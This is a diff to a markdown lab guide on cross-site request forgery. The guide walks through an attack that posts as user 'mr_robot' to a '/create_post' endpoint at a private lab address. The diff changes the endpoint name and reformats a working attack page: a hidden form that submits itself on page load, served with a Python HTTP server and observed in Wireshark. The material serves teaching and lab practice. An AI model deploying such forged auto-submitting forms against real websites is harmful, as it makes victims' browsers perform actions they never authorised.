@@ -3,23 +3,25 @@ A cross-site request occurs when a user interacts with one website via an HTTP r
 forms, the attacker can execute malicious operations on behalf of the authenticated user. 
 
 ## Attack
-In this attack you will create a post on behalf of user ```mr_robot```, exploring the `/create_posts` endpoint. The procedure is the following:
+In this attack you will create a post on behalf of user ```mr_robot```, exploring the `/create_post` endpoint. The procedure is the following:
 
 1.	Create a file named ```index.html``` at the attacker with the following code:
 
-``` html
-<!DOCTYPE html>
-<html>
-    <head>
-        <title>Fake Form</title>
-    </head>
-    <body onload="document.post_request.submit()">
-        <form action="http://192.168.0.100/create_post" method="POST" name="post_request" style="display: none;">
-            <input type="text" name="content" value="This is a forged post"/>
-        </form>
-    </body>
-</html>
-```
+    ??? note "CSRF Attack Page"
+
+        ``` html
+        <!DOCTYPE html>
+        <html>
+            <head>
+                <title>Fake Form</title>
+            </head>
+            <body onload="document.post_request.submit()">
+                <form action="http://192.168.0.100/create_post" method="POST" name="post_request" style="display: none;">
+                    <input type="text" name="content" value="This is a forged post"/>
+                </form>
+            </body>
+        </html>
+        ```
 
 2.  Run an HTTP server at the attacker using ```python3 -m http.server 80```.
 3.	Open a Wireshark probe at the victim-browser interface.
